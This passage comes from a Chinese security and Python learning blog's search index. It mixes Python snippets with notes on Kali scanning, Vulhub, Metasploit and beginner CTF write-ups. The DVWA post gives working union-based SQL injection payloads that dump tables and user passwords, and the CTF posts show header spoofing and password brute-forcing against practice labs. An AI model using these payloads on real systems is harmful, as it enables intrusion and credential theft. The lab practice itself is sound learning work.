          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件目录遍历</title>
      <link href="/categories/python/python%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
      <url>/categories/python/python%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>遍历目录</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">文件读写</span></span><br><span class="line"><span class="string">遍历目录下所有文件</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span><span class="params">(file)</span>:</span></span><br><span class="line">    fd = open(file, <span class="string">"a"</span>)</span><br><span class="line">    fd.write(<span class="string">"123456"</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFile</span><span class="params">(file)</span>:</span></span><br><span class="line">    fd = open(file, <span class="string">"r"</span>)</span><br><span class="line">    print(fd.readline())</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历目录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">walkFile</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(file):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            print(join(root, f))</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> dirs:</span><br><span class="line">            print(join(root, d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    walkFile(<span class="string">"./"</span>)</span><br><span class="line">    <span class="comment"># writeFile("file-result.txt")</span></span><br><span class="line">    <span class="comment"># readFile("file-result.txt")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python正则匹配</title>
      <link href="/categories/python/python%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"/>
      <url>/categories/python/python%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<p>正则匹配</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串</span></span><br><span class="line">str1 = <span class="string">'6中文9'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式</span></span><br><span class="line"><span class="comment"># 匹配双字节字符(包括汉字在内):  [^\x00-\xff]</span></span><br><span class="line"><span class="comment"># 匹配空白行  \n\s*\r</span></span><br><span class="line"><span class="comment"># 匹配Email地址  [\w!#$%&amp;'*+/=?^_`&#123;|&#125;~-]+(?:\.[\w!#$%&amp;'*+/=?^_`&#123;|&#125;~-]+)*@(?:[\w](?:[\w-]*[\w])?\.)+[\w](?:[\w-]*[\w])?</span></span><br><span class="line"><span class="comment"># 匹配网址URL  [a-zA-z]+://[^\s]*</span></span><br><span class="line"><span class="comment"># 匹配国内电话号码  \d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\&#123;7,8&#125;</span></span><br><span class="line"><span class="comment"># 匹配腾讯QQ号  [1-9][0-9]&#123;4,&#125;</span></span><br><span class="line"><span class="comment"># 匹配中国邮政编码  [1-9]\d&#123;5&#125;(?!\d)</span></span><br><span class="line"><span class="comment"># 匹配18位身份证号  ^(\d&#123;6&#125;)(\d&#123;4&#125;)(\d&#123;2&#125;)(\d&#123;2&#125;)(\d&#123;3&#125;)([0-9]|X)$</span></span><br><span class="line"><span class="comment"># 匹配(年-月-日)格式日期  ([0-9]&#123;3&#125;[1-9]|[0-9]&#123;2&#125;[1-9][0-9]&#123;1&#125;|[0-9]&#123;1&#125;[1-9][0-9]&#123;2&#125;|[1-9][0-9]&#123;3&#125;)-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8])))</span></span><br><span class="line"><span class="comment"># 匹配正整数  ^[1-9]\d*$</span></span><br><span class="line"><span class="comment"># 匹配负整数  ^-[1-9]\d*$</span></span><br><span class="line"><span class="comment"># 匹配整数  ^-?[1-9]\d*$</span></span><br><span class="line"><span class="comment"># 匹配非负整数（正整数 + 0）  ^[1-9]\d*|0$</span></span><br><span class="line"><span class="comment"># 匹配非正整数（负整数 + 0）  ^-[1-9]\d*|0$</span></span><br><span class="line"><span class="comment"># 匹配正浮点数  ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$</span></span><br><span class="line"><span class="comment"># 匹配负浮点数  ^-[1-9]\d*\.\d*|-0\.\d*[1-9]\d*$</span></span><br><span class="line">pattern_value = <span class="string">r"[\u4e00-\u9fa5]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个正则对象</span></span><br><span class="line">pattern = re.compile(pattern_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则匹配，方法：</span></span><br><span class="line"><span class="comment"># match()  开头匹配</span></span><br><span class="line"><span class="comment"># search()  全文匹配第一个</span></span><br><span class="line"><span class="comment"># findall()  全文匹配全部，返回列表</span></span><br><span class="line"><span class="comment"># finditer()  全文匹配全部，返回迭代器</span></span><br><span class="line">result = pattern.findall(str1)</span><br><span class="line"><span class="comment"># for i in result:</span></span><br><span class="line"><span class="comment">#     print(i.group())</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将符合正则的替换为某值</span></span><br><span class="line">result_sub = re.sub(pattern, <span class="string">'新文字'</span>, str1)</span><br><span class="line"><span class="comment"># print(result_sub)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python打印图片</title>
      <link href="/categories/python/python%E6%89%93%E5%8D%B0%E5%9B%BE%E7%89%87/"/>
      <url>/categories/python/python%E6%89%93%E5%8D%B0%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>打印图片</p><a id="more"></a><p>用在线工具将图片转为ascii</p><p>之后打印代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment"># Created by 0vox on 2020/5/26</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printP1</span><span class="params">()</span>:</span></span><br><span class="line">    fd = open(<span class="string">"dog.txt"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):</span><br><span class="line">        print(fd.readline(), end=<span class="string">""</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printP2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> open(<span class="string">"dog.txt"</span>):</span><br><span class="line">        print(text, end=<span class="string">""</span>)</span><br><span class="line">        <span class="comment"># print(text.replace("\r", "").replace("\n", ""))</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printP3</span><span class="params">()</span>:</span></span><br><span class="line">    dog_png = <span class="string">"""</span></span><br><span class="line"><span class="string">            ,i   :,,,,,,.:                       </span></span><br><span class="line"><span class="string">   ,,.,,,,,,,,,,,,,,,,,,                     </span></span><br><span class="line"><span class="string">    ,,,,,;1,,.,,,,,,.,,,:i                   </span></span><br><span class="line"><span class="string">    ;::,,, i ,,,,,,,,,;;:::.,;               </span></span><br><span class="line"><span class="string">  ::,,,,.:C8G.,,,,,,::::;:,:,.,:             </span></span><br><span class="line"><span class="string">   ,, ;,,, :,::.... ;1i ::i,::,,,,           </span></span><br><span class="line"><span class="string">      ,,,,: G ti  ::G88i::,,,,,,,:           </span></span><br><span class="line"><span class="string">      :     GLLLG. :,,::: ;;:,,:i            </span></span><br><span class="line"><span class="string">              .      :::: i;:::              </span></span><br><span class="line"><span class="string">         .:,,;      .:::   ;;::         ::   </span></span><br><span class="line"><span class="string">         .,.:..,1,,;;::     ;;;       .::i   </span></span><br><span class="line"><span class="string">           1,,::;::::::::::,.:::::::,:::,    </span></span><br><span class="line"><span class="string">                .:::::::::::::::::::::       </span></span><br><span class="line"><span class="string">           ;    .,::::::::::::::::::::i      </span></span><br><span class="line"><span class="string">             .....,:::::::::::::::::::;      </span></span><br><span class="line"><span class="string">             ;...,,::::::::::,::::::::,:     </span></span><br><span class="line"><span class="string">              ,;.,,:::::.... :::::::::::;    </span></span><br><span class="line"><span class="string">               ,,,:::::,........,:::::::::   </span></span><br><span class="line"><span class="string">               i,:::::i   ;;;;;;i  , ,,::::1 </span></span><br><span class="line"><span class="string">          ,  .  ::::::   ..;;;;;       .     </span></span><br><span class="line"><span class="string">         .         ..i ... ....;  . :.,      </span></span><br><span class="line"><span class="string">                   ;, ........       ;       </span></span><br><span class="line"><span class="string">             .. i                  i i;,,  </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    dog = dog_png.split(<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dog:</span><br><span class="line">        print(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    printP1()</span><br><span class="line">    <span class="comment"># printP2()</span></span><br><span class="line">    <span class="comment"># printP3()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>dog.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">      ,i   :,,,,,,.:                       </span><br><span class="line"> ,,.,,,,,,,,,,,,,,,,,,                     </span><br><span class="line">  ,,,,,;1,,.,,,,,,.,,,:i                   </span><br><span class="line">  ;::,,, i ,,,,,,,,,;;:::.,;               </span><br><span class="line">::,,,,.:C8G.,,,,,,::::;:,:,.,:             </span><br><span class="line"> ,, ;,,, :,::.... ;1i ::i,::,,,,           </span><br><span class="line">    ,,,,: G ti  ::G88i::,,,,,,,:           </span><br><span class="line">    :     GLLLG. :,,::: ;;:,,:i            </span><br><span class="line">            .      :::: i;:::              </span><br><span class="line">       .:,,;      .:::   ;;::         ::   </span><br><span class="line">       .,.:..,1,,;;::     ;;;       .::i   </span><br><span class="line">         1,,::;::::::::::,.:::::::,:::,    </span><br><span class="line">              .:::::::::::::::::::::       </span><br><span class="line">         ;    .,::::::::::::::::::::i      </span><br><span class="line">           .....,:::::::::::::::::::;      </span><br><span class="line">           ;...,,::::::::::,::::::::,:     </span><br><span class="line">            ,;.,,:::::.... :::::::::::;    </span><br><span class="line">             ,,,:::::,........,:::::::::   </span><br><span class="line">             i,:::::i   ;;;;;;i  , ,,::::1 </span><br><span class="line">        ,  .  ::::::   ..;;;;;       .     </span><br><span class="line">       .         ..i ... ....;  . :.,      </span><br><span class="line">                 ;, ........       ;       </span><br><span class="line">           .. i                  i i;,,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali之弱点扫描</title>
      <link href="/categories/Linux/Kali-Linux/kali%E4%B9%8B%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/"/>
      <url>/categories/Linux/Kali-Linux/kali%E4%B9%8B%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<p>漏洞发现</p><a id="more"></a><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ul><li>搜索漏洞利用代码</li></ul><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a></p><p>searchsploit tomcat (kali命令) `/usr/share/exploitdb</p><ul><li>概念</li></ul><p>cve</p><p>oval</p><h3 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h3><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/nmap/scrits</span><br><span class="line">less script.db | grep vuln | wc -l  <span class="comment"># 漏洞利用脚本个数</span></span><br></pre></td></tr></table></figure><p>nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i 报名 <span class="comment"># 安装</span></span><br><span class="line">/etc/init.d/nessesd start</span><br></pre></td></tr></table></figure><p>nexpose</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>metasploit</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub</title>
      <link href="/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
      <url>/categories/%E9%9D%B6%E5%9C%BA/vulhub/</url>
      
        <content type="html"><![CDATA[<p> Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。</p><p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub-github</a> </p><a id="more"></a><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>执行这部时，报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><p>报错为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</span><br><span class="line"></span><br><span class="line">If it’s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br></pre></td></tr></table></figure><p>解决办法，添加当前用户到docker用户组,后重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br></pre></td></tr></table></figure><p>开启docker服务，再运行，成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><h2 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enter the directory of vulnerability/environment</span></span><br><span class="line"><span class="built_in">cd</span> flask/ssti</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compile environment</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run environment</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># After the test, delete the environment with the following command.</span></span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="/categories/%E9%9D%B6%E5%9C%BA/DVWA/"/>
      <url>/categories/%E9%9D%B6%E5%9C%BA/DVWA/</url>
      
        <content type="html"><![CDATA[<p>dvwa靶场练习</p><a id="more"></a><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆库，表</span><br><span class="line">id&#x3D;0 union select database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23 &amp;Submit&#x3D;Submit</span><br><span class="line">爆字段名，此处的users转换为hex</span><br><span class="line">id&#x3D;0 union select database(),group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273 %23 &amp;Submit&#x3D;Submit</span><br><span class="line">爆字段值</span><br><span class="line">id&#x3D;0 union select database(),group_concat(user,0x3a,password) from dvwa.users %23 &amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>post报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">0&#39; union select database(),2 and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>就差一把钥匙</title>
      <link href="/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/"/>
      <url>/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=b67a6b78-4bb5-4446-b123-ec150d745093" target="_blank" rel="noopener">合天网安实验室靶场：就差一把钥匙</a></p><p>难度：初级</p><a id="more"></a><p>nmap嗅探，得到robots.txt,访问之</p><p><img src="1589039744189.png" alt="1589039744189"></p><p><img src="1589039820913.png" alt="1589039820913"></p><p>再访问console/</p><p><img src="1589039627734.png" alt="1589039627734"></p><p>添加x-forwarded-for: 127.0.0.1,篡改数据后send</p><p><img src="1589039550010.png" alt="1589039550010"></p><p>get flag!</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇的磁带</title>
      <link href="/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/"/>
      <url>/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=367e590e-6019-4673-ad94-2245c3574aff" target="_blank" rel="noopener">合天网安实验室靶场：神奇的磁带</a></p><p>难度：初级</p><a id="more"></a><p>这是一个套娃,下面开始蛇皮~</p><p>浏览器访问</p><p><img src="1589023144205.png" alt="1589023144205"></p><p>burp抓包，cookie值base64解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="built_in">echo</span> cTEyMzQ1Njc4OTBwLi4= | base64 -d</span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="built_in">echo</span> q1234567890p.. | base64</span><br></pre></td></tr></table></figure><p>提交解密后的值</p><p><img src="1589024250067.png" alt="1589024250067"></p><p>告诉我们要提交磁带的英文tape</p><p><img src="1589024264591.png" alt="1589024264591"></p><p>给了个txt文件地址，访问之</p><p><img src="1589023759850.png" alt="1589023759850"></p><p>提交btzhy</p><p><img src="1589024278213.png" alt="1589024278213"></p><p>给了个php页面，访问之</p><p><img src="1589023863272.png" alt="1589023863272"></p><p><img src="1589023887635.png" alt="1589023887635"></p><p>看源码，提示密码两位，生成字典，burp爆破模块，爆破之</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 2 <span class="string">"0123456789"</span> &gt; pwd.txt</span><br></pre></td></tr></table></figure><p>比较响应长度，确认为66</p><p>提交，get flag!</p><p><img src="1589024100690.png" alt="1589024100690"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit入门</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/metasploit%E5%85%A5%E9%97%A8/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/metasploit%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Metasploit基本使用</p><a id="more"></a><h2 id="检查更新"><a href="#检查更新" class="headerlink" title="检查更新"></a>检查更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install Metasploit-framework</span><br></pre></td></tr></table></figure><h2 id="msfconsole用户接口"><a href="#msfconsole用户接口" class="headerlink" title="msfconsole用户接口"></a>msfconsole用户接口</h2><p>msfconsole位于 /usr/share/metasploit-framework/msfconsole 目录中 </p><p>几乎可以使用全部msf功能</p><p>控制台命令支持</p><p>Tab自动补齐</p><p>支持外部命令的执行（系统命令等）</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h3 id="静默启动"><a href="#静默启动" class="headerlink" title="静默启动"></a>静默启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><ul><li><h4 id="在控制台传递-h参数"><a href="#在控制台传递-h参数" class="headerlink" title="在控制台传递-h参数"></a>在控制台传递-h参数</h4></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -h</span><br></pre></td></tr></table></figure><p><strong>用法</strong>: msfconsole [选项]</p><p><strong>通用选项</strong>:<br> -E, –environment ENVIRONMENT     如果已设置，将使用RAIL_ENV环境变量。如果两个选项都不是RAILS_ENV环境变量，则默认为生产。 </p><p><strong>数据库选项</strong>:<br> -M, –migration-path DIRECTORY    指定包含其他数据库迁移的目录<br> -n, –no-database                 禁用数据库支持<br> -y, –yaml PATH                   指定一个包含数据库设置的YAML文件 </p><p><strong>框架选项</strong> :<br> -c FILE                           加载指定的配置文件<br> -v, -V, –version                 显示版本 </p><p><strong>模块选项</strong> :<br> –defer-module-loads          延迟模块加载，除非明确询问。<br> -m, –module-path DIRECTORY       附加模块路径 </p><p><strong>控制台选项</strong> :<br> -a, –ask                         在退出Metasploit之前询问或接受“exit-y”<br> -H, –history-file FILE           将命令历史保存到指定的文件<br> -L, –real-readline               使用系统Readline库而不是RbReadline<br> -o, –output FILE                 将文件输出到指定的文件<br> -p, –plugin PLUGIN               在启动时加载插件<br> -q, –quiet                       不要在启动时打印横幅<br> -r, –resource FILE               执行指定的资源文件（ - 用于stdin）<br> -x, –execute-command COMMAND     执行指定的字符串作为控制台命令（使用;用于multiples）<br> -h, –help                       显示此消息 </p><ul><li><h4 id="在msf命令提示符下输入help或"><a href="#在msf命令提示符下输入help或" class="headerlink" title="在msf命令提示符下输入help或?"></a>在msf命令提示符下输入<code>help</code>或<code>?</code></h4></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p><strong>核心命令</strong></p><p>命令       描述</p><hr><p>?             帮助菜单<br>banner        显示一个awesome metasploit横幅<br>cd            更改当前的工作目录<br>color         切换颜色<br>connect       连接与主机通信<br>exit          退出控制台<br>get           获取特定于上下文的变量的值<br>getg          获取全局变量的值<br>grep          grep另一个命令的输出<br>help          帮助菜单<br>history       显示命令历史<br>load          加载一个框架插件<br>quit          退出控制台<br>repeat        Repeat a list of commands<br>route         通过会话路由流量<br>save          保存活动的数据存储<br>sessions      转储会话列表并显示有关会话的信息<br>set           将特定于上下文的变量设置为一个值<br>setg          将特定于上下文的变量设置为一个值<br>sleep         在指定的秒数内不做任何事情<br>spool         将控制台输出写入文件以及屏幕<br>threads   